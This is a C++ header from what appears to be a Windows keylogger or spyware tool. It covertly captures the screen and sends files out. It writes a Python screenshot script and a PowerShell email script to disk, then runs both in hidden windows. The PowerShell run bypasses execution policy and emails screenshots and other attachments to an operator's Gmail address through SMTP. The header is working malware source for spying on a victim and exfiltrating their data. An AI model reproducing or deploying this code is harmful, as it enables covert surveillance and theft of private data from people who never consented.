//this module will create the scripts and execute them (email/screenshoot) 
#ifndef SENDMAIL_H
#define SENDMAIL_H

#include <fstream>
#include <vector>
#include <windows.h>
#include "IO.h"
#include "Helper.h"
#include "Timer.h"


#define SCRIPT_NAME "sm.ps1"
#define SCRIPT_NAME_PYTHON "sm1.py"


namespace Mail{
	//change this variable
	#define X_EM_TO "toEmail@gmail.com" //email that will recieve your files
	#define X_EM_FROM "yourEmail@gmail.com" //your email
	#define X_EM_PASS "password" // your password


	const std::string &PowerShellScript =
	"Param(\n"
"    [String]$Att,\n"
"    [String]$Body,\n"
"    [String]$Subj\n"
")\n"

"$Username = \""+std::string(X_EM_FROM)+"\";\n"
"$Password = \""+std::string(X_EM_PASS)+"\";\n"

"function Send-ToEmail([string]$email, [string]$attachmentpath){\n"

"    $message = new-object Net.Mail.MailMessage;\n"
"    $message.From = $Username;\n"
"    $message.To.Add($email);\n"
"    $message.Subject = $Subj;\n"
"    $message.Body = $Body;\n"
"    $attsplit = $attachmentpath.split(\"@\");\n"
    
"    foreach($doc in $attsplit){\n"
"        $attachment = New-Object Net.Mail.Attachment($doc);\n"
"        $message.Attachments.Add($attachment);\n"
"    }\n"

    
"    $smtp = new-object Net.Mail.SmtpClient(\"smtp.gmail.com\", \"587\");\n"
"    $smtp.EnableSSL = $true;\n"
"    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);\n"
"    $smtp.send($message);\n"
"    $attachment.Dispose();\n"
"    exit 1;\n"
"}\n"
"Send-ToEmail  -email \"" +std::string(X_EM_TO)+ "\" -attachmentpath $Att;\n";

const std::string &PythonScript = 
"from PIL import ImageGrab\n"
"import sys\n"
"snapshot = ImageGrab.grab()\n"
"path = sys.argv[1]\n"
"snapshot.save(path)";



#undef X_EM_FROM
#undef X_EM_TO
#undef X_EM_PASS

	std::string StringReplace(std::string s, const std::string &what , const std::string &with){
		if(what.empty()) return s;
		size_t sp = 0;
		while((sp = s.find(what,sp)) != std::string::npos)
			s.replace(sp,what.length(),with), sp+=with.length();
		return s;
	}

	bool CheckFileExists(const std::string &f){
		std::ifstream file(f);
		return (bool) file;
	}
	bool CreateScript(){
		std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));
		if(!script)
			return false;
		script << PowerShellScript;
		if (!script)
			return false;
		script.close();
		return true;
	}
	bool CreateScriptPython(){
		std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME_PYTHON));
		if(!script)
			return false;
		script << PythonScript;
		if (!script)
			return false;
		script.close();
		return true;
	}

	Timer m_timer;
	int SendMail(const std::string &subject,const std::string &body , const std::string &attachments){
		bool ok;
		ok = IO::MKDir(IO::GetOurPath(true));
		if(!ok) 
			return -1;
		std::string src_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);
		if(!CheckFileExists(src_path))
			ok = CreateScript();
		if(!ok)
			return -2;
		std::string src_path_py = IO::GetOurPath(true) + std::string(SCRIPT_NAME_PYTHON);
		if(!CheckFileExists(src_path_py))
			ok = CreateScriptPython();
		if(!ok)
			return -4;
		//std::cout << StringReplace(attachments,"\\","\\\\") << "\n";
		std::string paramsPy = IO::GetOurPath(true) + std::string(SCRIPT_NAME_PYTHON) + " " + IO::GetOurPath(true) + std::string("screen.jpg");
		SHELLEXECUTEINFO ShExecInfoPy = {0};
		ShExecInfoPy.cbSize = sizeof(SHELLEXECUTEINFO);
		ShExecInfoPy.fMask  = SEE_MASK_NOCLOSEPROCESS;
		ShExecInfoPy.hwnd = NULL;
		ShExecInfoPy.lpVerb = NULL;
		ShExecInfoPy.lpFile = "python";
		ShExecInfoPy.lpParameters = paramsPy.c_str();
		ShExecInfoPy.lpDirectory = NULL;
		ShExecInfoPy.nShow = SW_HIDE;
		ShExecInfoPy.hInstApp = NULL;

		ok = (bool) ShellExecuteEx(&ShExecInfoPy);
		if(!ok) 
			return -3;

		WaitForSingleObject(ShExecInfoPy.hProcess,7000);
		DWORD exit_codePy = 100;
		GetExitCodeProcess(ShExecInfoPy.hProcess,&exit_codePy);
		printf("after python %d\n",(int) exit_codePy);

		////////
		std::string params = "-ExecutionPolicy ByPass -File "+ StringReplace(src_path,"\\","\\\\")+" -Body \"" +StringReplace(body,"\"","\\\"") +"\" -Subj \"" + StringReplace(subject,"\"","\\\"") + "\" -Att " +StringReplace(attachments,"\\","\\\\");
		SHELLEXECUTEINFO ShExecInfo = {0};
		ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
		ShExecInfo.fMask  = SEE_MASK_NOCLOSEPROCESS;
		ShExecInfo.hwnd = NULL;
		ShExecInfo.lpVerb = "open";
		ShExecInfo.lpFile = "powershell";
		ShExecInfo.lpParameters = params.c_str();
		ShExecInfo.lpDirectory = NULL;
		ShExecInfo.nShow = SW_HIDE;
		ShExecInfo.hInstApp = NULL;

		ok = (bool) ShellExecuteEx(&ShExecInfo);
		if(!ok) 
			return -3;

		WaitForSingleObject(ShExecInfo.hProcess,7000);
		DWORD exit_code = 100;
		GetExitCodeProcess(ShExecInfo.hProcess,&exit_code);
		m_timer.SetFunction([&](){
				WaitForSingleObject(ShExecInfo.hProcess,60000);
				GetExitCodeProcess(ShExecInfo.hProcess,&exit_code);
				if((int)exit_code == STILL_ACTIVE)
					TerminateProcess(ShExecInfo.hProcess,100);
				Helper::WriteAppLog("<From SendMail> Return code: "+ Helper::ToString((int)exit_code));
		});


		m_timer.RepeatCount(1L);
		m_timer.SetInterval(10L);
		m_timer.Start(true);
		return (int)exit_code;
	}


	int SendMail(const std::string &subject,const std::string &body , const std::vector<std::string> &att){
		std::string attachments ="";
		if(att.size() == 1U)
			attachments = att[0];
		else 
			for(const auto &c:att)
				attachments += c +"@";
		attachments = attachments.substr(0,attachments.length()-1);
		return SendMail(subject,body,attachments);
	}
}

#endif